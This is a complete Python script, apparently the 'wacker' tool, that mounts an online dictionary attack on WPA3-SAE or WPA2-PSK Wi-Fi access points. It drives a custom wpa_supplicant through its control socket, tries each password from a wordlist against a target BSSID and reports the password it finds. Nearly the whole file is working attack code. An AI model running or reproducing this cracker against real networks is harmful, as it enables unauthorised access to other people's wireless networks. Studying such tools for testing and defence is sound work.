#!/usr/bin/env python3

import argparse
import logging
import os
import re
import signal
import socket
import stat
import subprocess
import sys
import time

assert sys.version_info >= (3,7)

def kill(sig, frame):
    try:
        wacker.kill()
        print(f'Stopped at password attempt: {word}')
    except:
        pass
    sys.exit(0)

signal.signal(signal.SIGINT, kill)

class Wacker(object):
    RETRY = 0
    SUCCESS = 1
    FAILURE = 2
    EXIT = 3

    def __init__(self, args, start_word):
        self.args = args
        self.start_word = start_word
        self.dir  = f'/tmp/wacker'
        self.server = f'{self.dir}/{args.interface}'
        self.conf = f'{self.server}.conf'
        self.log  = f'{self.server}.log'
        self.wpa  = '/usr/share/wef/wacker/wpa_supplicant_amd64'
        self.pid  = f'{self.server}.pid'
        self.me = f'{self.dir}/{args.interface}_client'
        self.key_mgmt = ('SAE', 'WPA-PSK')[args.brute_wpa2]
        self.cmd = f'{self.wpa} -P {self.pid} -B -i {self.args.interface} -c {self.conf}'
        if args.debug:
            self.cmd += f' -d -t -K -f {self.log}'
        self.cmd = self.cmd.split()
        wpa_conf = 'ctrl_interface={}\n\n{}network={{\n}}'.format(self.dir, ('sae_pwe=2\n\n', '')[args.brute_wpa2])
        self.total_count = int(subprocess.check_output(f'wc -l {args.wordlist.name}', shell=True).split()[0].decode('utf-8'))

        # Create supplicant dir and conf (first be destructive)
        os.system(f'mkdir {self.dir} 2> /dev/null')
        os.system(f'rm -f {self.dir}/{args.interface}*')
        with open(self.conf, 'w') as f:
            f.write(wpa_conf)

        loglvl = logging.DEBUG if args.debug else logging.INFO
        logging.basicConfig(level=loglvl, filename=f'{self.server}_wacker.log', filemode='w', format='%(message)s')

        # Initial supplicant setup
        self.start_supplicant()
        self.create_uds_endpoints()
        self.one_time_setup()

        # Create rolling average for pwd/sec
        self.rolling = [0] * 150
        self.start_time = time.time()
        self.lapse = self.start_time
        print('Start time: {}'.format(time.strftime('%d %b %Y %H:%M:%S', time.localtime(self.start_time))))

    def create_uds_endpoints(self):
        ''' Create unix domain socket endpoints '''
        try:
            os.unlink(self.me)
        except Exception:
            if os.path.exists(self.me):
                raise

        # bring the interface up... won't connect otherwise
        os.system(f'ip link set dev {self.args.interface} up')

        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.sock.bind(self.me)

        logging.info(f'Connecting to {self.server}')
        try:
            self.sock.connect(self.server)
        except Exception:
            raise

    def start_supplicant(self):
        ''' Spawn a wpa_supplicant instance '''
        print(f'Starting wpa_supplicant...')
        proc = subprocess.Popen(self.cmd)
        time.sleep(2)
        logging.info(f'Started wpa_supplicant')

        # Double check it's running
        mode = os.stat(self.server).st_mode
        if not stat.S_ISSOCK(mode):
            raise Exception(f'Missing {self.server}...Is wpa_supplicant running?')

    def send_to_server(self, msg):
        ''' Send a message to the supplicant '''
        logging.debug(f'sending {msg}')
        self.sock.sendall(msg.encode())
        d = self.sock.recv(1024).decode().rstrip('\n')
        if d == "FAIL":
            raise Exception(f'{msg} failed!')
        return d

    def one_time_setup(self):
        ''' One time setup needed for supplicant '''
        self.send_to_server('ATTACH')
        self.send_to_server(f'SET_NETWORK 0 ssid "{self.args.ssid}"')
        self.send_to_server(f'SET_NETWORK 0 key_mgmt {self.key_mgmt}')
        self.send_to_server(f'SET_NETWORK 0 bssid {self.args.bssid}')
        self.send_to_server(f'SET_NETWORK 0 scan_freq {self.args.freq}')
        self.send_to_server(f'SET_NETWORK 0 freq_list {self.args.freq}')
        self.send_to_server(f'SET_NETWORK 0 ieee80211w 1')
        self.send_to_server(f'DISABLE_NETWORK 0')
        logging.debug(f'--- created network block 0 ---\n')

    def send_connection_attempt(self, psk):
        ''' Send a connection request to supplicant'''
        logging.info(f'Trying key: {psk}')
        if self.key_mgmt == 'SAE':
            self.send_to_server(f'SET_NETWORK 0 sae_password "{psk}"')
        else:
            self.send_to_server(f'SET_NETWORK 0 psk "{psk}"')
        self.send_to_server(f'ENABLE_NETWORK 0')

    def listen(self, count):
        ''' Listen for responses from supplicant '''
        while True:
            datagram = self.sock.recv(2048)
            if not datagram:
                logging.error('WTF!!!! datagram is null?!?!?! Exiting.')
                return Wacker.RETRY

            data = datagram.decode().rstrip('\n')
            event = data.split()[0]
            logging.debug(data)
            if event == "<3>CTRL-EVENT-BRUTE-FAILURE":
                self.print_stats(count)
                self.send_to_server(f'DISABLE_NETWORK 0')
                logging.info('BRUTE ATTEMPT FAIL\n')
                return Wacker.FAILURE
            elif event == "<3>CTRL-EVENT-NETWORK-NOT-FOUND":
                self.send_to_server(f'DISABLE_NETWORK 0')
                msg = f'No suitable target found for freq={self.args.freq}, bssid={self.args.bssid}, ssid={self.args.ssid}'
                logging.info(f'NETWORK NOT FOUND\n{msg}')
                print(f'\n{msg}')
                return Wacker.EXIT
            elif event == "<3>CTRL-EVENT-SCAN-FAILED":
                self.send_to_server(f'DISABLE_NETWORK 0')
                logging.info('SCAN FAILURE')
                return Wacker.EXIT
            elif event == "<3>CTRL-EVENT-BRUTE-SUCCESS":
                self.print_stats(count)
                logging.info('BRUTE ATTEMPT SUCCESS\n')
                return Wacker.SUCCESS
            elif event == "<3>CTRL-EVENT-BRUTE-RETRY":
                logging.info('BRUTE ATTEMPT RETRY\n')
                self.send_to_server(f'DISABLE_NETWORK 0')
                return Wacker.RETRY

    def print_stats(self, count):
        ''' Print some useful stats '''
        current = time.time()
        avg = 1 / (current - self.lapse)
        self.lapse = current
        # create rolling average
        if count <= 150:
            self.rolling[count-1] = avg
            avg = sum(self.rolling[:count]) / count
        else:
            self.rolling[(count-1) % 150] = avg
            avg = sum(self.rolling) / 150
        spot = self.start_word + count
        est = (self.total_count - spot) / avg
        percent = spot / self.total_count * 100
        end = time.strftime('%d %b %Y %H:%M:%S', time.localtime(current + est))
        lapse = current - self.start_time
        print(f'{spot:8} / {self.total_count:<8} words ({percent:2.2f}%) : {avg:4.0f} words/sec : ' \
              f'{lapse/3600:5.3f} hours lapsed : {est/3600:8.2f} hours to exhaust ({end})', end='\r')

    def kill(self):
        ''' Kill the supplicant '''
        print('\nStop time: {}'.format(time.strftime('%d %b %Y %H:%M:%S', time.localtime(time.time()))))
        os.kill(int(open(self.pid).read()), signal.SIGKILL)

def check_bssid(mac):
    if not re.match(r'^([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})$', mac):
        raise argparse.ArgumentTypeError(f'{mac} is not a valid bssid')
    return mac

def check_interface(interface):
    if not os.path.isdir(f'/sys/class/net/{interface}/wireless/'):
        raise argparse.ArgumentTypeError(f'{interface} is not a wireless adapter')
    return interface

parser = argparse.ArgumentParser(description='A WPA3 dictionary cracker. Must run as root!')
parser.add_argument('--wordlist', type=argparse.FileType('r'), required=True, help='wordlist to use', dest='wordlist')
parser.add_argument('--interface', type=check_interface, dest='interface', required=True, help='interface to use')
parser.add_argument('--bssid', type=check_bssid, dest='bssid', required=True, help='bssid of the target')
parser.add_argument('--ssid', type=str, dest='ssid', required=True, help='the ssid of the WPA3 AP')
parser.add_argument('--freq', type=int, dest='freq', required=True, help='frequency of the ap')
parser.add_argument('--start', type=str, dest='start_word', help='word to start with in the wordlist')
parser.add_argument('--debug', action='store_true', help='increase logging output')
parser.add_argument('--wpa2', dest='brute_wpa2', action='store_true', help='brute force wpa2-personal')

args = parser.parse_args()

if os.geteuid() != 0:
    print('This script must be run as root!')
    sys.exit(0)

# Find requested startword
offset=0
start_word = 0
if args.start_word:
    print(f'Starting with word "{args.start_word}"')
    for word in args.wordlist:
        if word.rstrip('\n') == args.start_word:
            args.wordlist.seek(offset, os.SEEK_SET)
            break;
        offset += len(word.encode('utf-8'))
        start_word += 1
    else:
        print(f'Requested start word "{args.start_word}" not found!')
        sys.exit(1)

wacker = Wacker(args, start_word)

def attempt(word, count):
    while True:
        wacker.send_connection_attempt(word)
        result = wacker.listen(count)
        if result == Wacker.EXIT:
            kill(None, None)
        elif result != Wacker.RETRY:
            return result

# Start the cracking
count = 1
for word in args.wordlist:
    word = word.rstrip('\n')
    # SAE allows all lengths otherwise WPA2 has restrictions
    if not args.brute_wpa2 or 8 <= len(word.encode('utf-8')) <= 63:
        result = attempt(word, count)
        if result == Wacker.SUCCESS:
            print(f"\nFound the password: '{word}'")
            break
    else:
        print(f'Bad word in wordlist: "{word}"')
    count += 1
else:
    print('\nFlag not found')

wacker.kill()
